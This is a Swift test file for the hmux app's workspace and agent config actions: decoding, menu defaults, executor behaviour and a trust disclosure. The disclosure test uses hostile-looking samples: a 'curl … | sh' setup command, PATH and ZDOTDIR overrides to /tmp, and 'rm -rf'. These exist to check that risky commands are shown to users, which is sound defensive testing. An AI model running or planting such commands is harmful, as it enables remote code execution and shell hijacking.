import HmuxWorkspaces
import Foundation
import Testing

#if canImport(hmux_DEV)
@testable import hmux_DEV
#elseif canImport(hmux)
@testable import hmux
#endif

/// Inline `type: "workspace"` config actions: decoding, resolution defaults,
/// plus-button menu auto-append, trust disclosure, and executor behavior.
struct HmuxConfigWorkspaceActionTests {
    private func decode(_ json: String) throws -> HmuxConfigFile {
        try JSONDecoder().decode(HmuxConfigFile.self, from: Data(json.utf8))
    }

    private func workspaceAction(
        in config: HmuxConfigFile,
        id: String
    ) throws -> (definition: HmuxWorkspaceDefinition, restart: HmuxRestartBehavior?) {
        let action = try #require(config.actions[id]?.action)
        return try #require(action.inlineWorkspace)
    }

    // MARK: - Decoding workspace actions

    @Test func decodeWorkspaceActionWithExplicitType() throws {
        let config = try decode("""
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "restart": "recreate",
              "newWorkspaceMenu": true,
              "workspace": {
                "name": "Dev",
                "cwd": "~/code/app",
                "setup": "  git fetch --all  ",
                "layout": {
                  "direction": "horizontal",
                  "split": 0.4,
                  "children": [
                    { "pane": { "surfaces": [ { "type": "terminal", "command": "claude", "focus": true } ] } },
                    { "pane": { "surfaces": [ { "type": "browser", "url": "https://example.com" } ] } }
                  ]
                }
              }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "dev-setup")
        #expect(inline.definition.name == "Dev")
        #expect(inline.definition.cwd == "~/code/app")
        #expect(inline.definition.setup == "git fetch --all")
        #expect(inline.restart == .recreate)
        #expect(config.actions["dev-setup"]?.newWorkspaceMenu == true)
        guard case .split(let split)? = inline.definition.layout else {
            Issue.record("Expected split layout")
            return
        }
        #expect(split.direction == .horizontal)
        #expect(split.children.count == 2)
    }

    @Test func decodeWorkspaceActionInferredFromWorkspaceKey() throws {
        let config = try decode("""
        {
          "actions": {
            "quick": {
              "title": "Quick",
              "workspace": { "name": "Quick" }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "quick")
        #expect(inline.definition.name == "Quick")
        #expect(inline.restart == nil)
    }

    @Test func workspaceActionRequiresWorkspaceObject() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "broken": { "type": "workspace", "title": "Broken" }
              }
            }
            """)
        }
    }

    @Test func workspaceActionEncodeDecodeRoundTrip() throws {
        let definition = HmuxWorkspaceDefinition(
            name: "Round Trip",
            cwd: "~/code",
            env: ["FOO": "bar"],
            setup: "make deps",
            layout: .split(HmuxSplitDefinition(
                direction: .vertical,
                split: 0.3,
                children: [
                    .pane(HmuxPaneDefinition(surfaces: [
                        HmuxSurfaceDefinition(type: .terminal, name: "Agent", command: "opencode", focus: true)
                    ])),
                    .pane(HmuxPaneDefinition(surfaces: [
                        HmuxSurfaceDefinition(type: .browser, url: "https://example.com")
                    ])),
                ]
            ))
        )
        let original = HmuxConfigActionDefinition(
            action: .workspace(definition, restart: .confirm),
            title: "Round Trip",
            newWorkspaceMenu: false
        )
        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(HmuxConfigActionDefinition.self, from: data)
        #expect(decoded == original)
    }

    @Test func decodeBlankSetupBecomesNil() throws {
        let config = try decode("""
        {
          "actions": {
            "blank-setup": { "workspace": { "name": "X", "setup": "   " } }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "blank-setup")
        #expect(inline.definition.setup == nil)
    }

    // MARK: - Agent kinds

    @Test func decodeKnownAndCustomAgents() throws {
        let config = try decode("""
        {
          "actions": {
            "oc": { "type": "agent", "agent": "opencode" },
            "custom": { "type": "agent", "agent": "aider", "args": "--model gpt" }
          }
        }
        """)
        guard case .agent(let ocKind, _)? = config.actions["oc"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(ocKind == .opencode)
        #expect(ocKind.commandName == "opencode")

        guard case .agent(let customKind, let args)? = config.actions["custom"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(customKind == .custom("aider"))
        #expect(customKind.commandName == "aider")
        #expect(args == "--model gpt")
        #expect(config.actions["custom"]?.action?.terminalCommand == "aider --model gpt")
    }

    @Test func customAgentRejectsWhitespaceNames() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "bad": { "type": "agent", "agent": "aider --yolo" }
              }
            }
            """)
        }
    }

    @Test func agentEncodeRoundTrip() throws {
        for kind in [HmuxConfigAgentKind.codex, .claudeCode, .opencode, .custom("goose")] {
            let data = try JSONEncoder().encode(kind)
            let decoded = try JSONDecoder().decode(HmuxConfigAgentKind.self, from: data)
            #expect(decoded == kind)
        }
    }

    // MARK: - Resolved action defaults

    @Test func wantsNewWorkspaceMenuDefaults() throws {
        let workspaceAction = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "ws",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "W"), restart: nil)
            ),
            sourcePath: nil
        ))
        #expect(workspaceAction.wantsNewWorkspaceMenu)

        let commandAction = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "cmd",
            definition: HmuxConfigActionDefinition(action: .command("make")),
            sourcePath: nil
        ))
        #expect(!commandAction.wantsNewWorkspaceMenu)

        let optedOut = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "ws2",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "W2"), restart: nil),
                newWorkspaceMenu: false
            ),
            sourcePath: nil
        ))
        #expect(!optedOut.wantsNewWorkspaceMenu)

        let optedIn = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "cmd2",
            definition: HmuxConfigActionDefinition(
                action: .command("make"),
                newWorkspaceMenu: true
            ),
            sourcePath: nil
        ))
        #expect(optedIn.wantsNewWorkspaceMenu)
    }

    @Test func actionsAndLaunchersDiscoveryReportsEffectivePlacements() throws {
        let configPath = "/Users/test/.config/hmux/hmux.json"
        let shortcut = try #require(StoredShortcut.parseConfig("cmd+shift+r"))
        let agent = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "review-agent",
            definition: HmuxConfigActionDefinition(
                action: .agent(.claudeCode, args: nil),
                title: "Review Agent",
                palette: true,
                shortcut: shortcut
            ),
            sourcePath: configPath
        ))
        let layout = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "review-layout",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "Review"), restart: nil),
                title: "Review Layout",
                palette: false,
                newWorkspaceMenu: true
            ),
            sourcePath: configPath
        ))
        let model = ActionsAndLaunchersDiscoveryModel.build(
            actions: [HmuxResolvedConfigAction.builtIn(.newTerminal), layout, agent],
            resolvedNewWorkspaceActionID: layout.id,
            newWorkspaceMenuActionIDs: [layout.id],
            surfaceTabBarActionIDs: [agent.id]
        )

        #expect(model.entries.map(\.id) == [agent.id, layout.id])

        let agentEntry = try #require(model.entries.first { $0.id == agent.id })
        #expect(agentEntry.actionType == "agent")
        #expect(agentEntry.appearsInCommandPalette)
        #expect(!agentEntry.isNewWorkspaceDefault)
        #expect(!agentEntry.appearsInNewWorkspaceMenu)
        #expect(agentEntry.appearsInSurfaceTabBar)
        #expect(agentEntry.shortcutDisplay == shortcut.displayString)

        let layoutEntry = try #require(model.entries.first { $0.id == layout.id })
        #expect(layoutEntry.actionType == "workspace")
        #expect(!layoutEntry.appearsInCommandPalette)
        #expect(layoutEntry.isNewWorkspaceDefault)
        #expect(layoutEntry.appearsInNewWorkspaceMenu)
        #expect(!layoutEntry.appearsInSurfaceTabBar)
        #expect(layoutEntry.shortcutDisplay == nil)

        #expect(!model.entries.contains { $0.id == HmuxSurfaceTabBarBuiltInAction.newTerminal.configID })
    }

    @Test func actionsDiscoveryDoesNotInferSurfacePlacementFromEqualPayloads() throws {
        let configPath = "/Users/test/.config/hmux/hmux.json"
        let first = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "first",
            definition: HmuxConfigActionDefinition(
                action: .command("echo same"),
                title: "First"
            ),
            sourcePath: configPath
        ))
        let second = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "second",
            definition: HmuxConfigActionDefinition(
                action: .command("echo same"),
                title: "Second"
            ),
            sourcePath: configPath
        ))

        let model = ActionsAndLaunchersDiscoveryModel.build(
            actions: [first, second],
            resolvedNewWorkspaceActionID: nil,
            newWorkspaceMenuActionIDs: [],
            surfaceTabBarActionIDs: [first.id]
        )

        #expect(model.entries.first { $0.id == first.id }?.appearsInSurfaceTabBar == true)
        #expect(model.entries.first { $0.id == second.id }?.appearsInSurfaceTabBar == false)
    }

    // MARK: - Executor

    @Test func inlineWorkspaceSyntheticCommandCarriesConfirm() throws {
        let action = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "confirm-me",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "C"), restart: .ignore),
                title: "Confirm Me",
                confirm: true
            ),
            sourcePath: nil
        ))
        let syntheticCommand = try #require(action.inlineWorkspaceSyntheticCommand)
        #expect(syntheticCommand.confirm == true)
        #expect(syntheticCommand.restart == .ignore)
        #expect(syntheticCommand.workspace?.name == "C")

        let button = HmuxSurfaceTabBarButton(
            id: "confirm-button",
            title: "Confirm Button",
            action: .workspace(HmuxWorkspaceDefinition(name: "B"), restart: nil),
            confirm: true
        )
        #expect(button.inlineWorkspaceSyntheticCommand?.confirm == true)
    }

    @MainActor
    @Test func workspaceShellDisclosureListsSetupCommandsAndEnv() {
        let command = HmuxCommandDefinition(
            name: "Innocent Name",
            workspace: HmuxWorkspaceDefinition(
                name: "W",
                cwd: "~/somewhere/else",
                env: ["ZDOTDIR": "/tmp/evil"],
                setup: "curl example.com/install.sh | sh",
                layout: .split(HmuxSplitDefinition(
                    direction: .horizontal,
                    split: 0.5,
                    children: [
                        .pane(HmuxPaneDefinition(surfaces: [
                            HmuxSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
                        ])),
                        .pane(HmuxPaneDefinition(surfaces: [
                            HmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
                            HmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch", cwd: "/tmp/target"),
                        ])),
                    ]
                ))
            )
        )

        let disclosure = HmuxConfigExecutor.workspaceShellDisclosure(command)
        #expect(disclosure.hasPrefix("Innocent Name"))
        // Setup runs in the first terminal surface; its cwd is workspace-level
        // here (the first terminal has no cwd override), so the plain line shows.
        #expect(disclosure.contains("curl example.com/install.sh | sh"))
        #expect(disclosure.contains("claude"))
        // Env assignments, cwd values, and URLs change what executes and
        // where; they must be disclosed too.
        #expect(disclosure.contains("ZDOTDIR=/tmp/evil"))
        #expect(disclosure.contains("PATH=/tmp/bin"))
        #expect(disclosure.contains("cwd: ~/somewhere/else"))
        #expect(disclosure.contains("cwd /tmp/target: rm -rf ./scratch"))
        #expect(disclosure.contains("url: https://example.com"))

        let plain = HmuxCommandDefinition(
            name: "Plain",
            workspace: HmuxWorkspaceDefinition(name: "P")
        )
        #expect(HmuxConfigExecutor.workspaceShellDisclosure(plain) == "Plain")
    }

    @MainActor
    @Test func inlineWorkspaceActionCreatesWorkspace() throws {
        let manager = TabManager(
            initialWorkingDirectory: NSTemporaryDirectory()
        )
        let action = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "Dev Setup"), restart: nil),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(HmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/hmux-test-global-config.json"
        ))

        #expect(manager.tabs.count == 2)
        #expect(manager.selectedWorkspace?.customTitle == "Dev Setup")
        #expect(manager.selectedWorkspace?.effectiveCustomTitleSource == .auto)
    }

    @MainActor
    @Test func inlineWorkspaceSurfaceTabBarButtonExecutesOnClick() throws {
        let manager = TabManager()
        let workspace = try #require(manager.tabs.first)
        let button = HmuxSurfaceTabBarButton(
            id: "review-setup",
            title: "Review Setup",
            action: .workspace(HmuxWorkspaceDefinition(name: "Review"), restart: nil)
        )
        workspace.applySurfaceTabBarButtons(
            [button],
            sourcePath: nil,
            globalConfigPath: "/tmp/hmux-test-global-config.json",
            terminalCommandSourcePaths: [:],
            workspaceCommands: [:]
        )

        let pane = try #require(workspace.bonsplitController.allPaneIds.first)
        workspace.splitTabBar(
            workspace.bonsplitController,
            didRequestCustomAction: "review-setup",
            inPane: pane
        )

        #expect(manager.tabs.count == 2, "inline workspace button click should create the workspace")
        #expect(manager.selectedWorkspace?.customTitle == "Review")
    }

    @MainActor
    @Test func inlineWorkspaceActionHonorsIgnoreRestart() throws {
        let manager = TabManager()
        let existingWorkspace = manager.tabs[0]
        existingWorkspace.setCustomTitle("Dev Setup")

        let action = try #require(HmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: HmuxConfigActionDefinition(
                action: .workspace(HmuxWorkspaceDefinition(name: "Dev Setup"), restart: .ignore),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(HmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/hmux-test-global-config.json"
        ))

        #expect(manager.tabs.map(\.id) == [existingWorkspace.id])
        #expect(manager.selectedWorkspace?.id == existingWorkspace.id)
    }
}
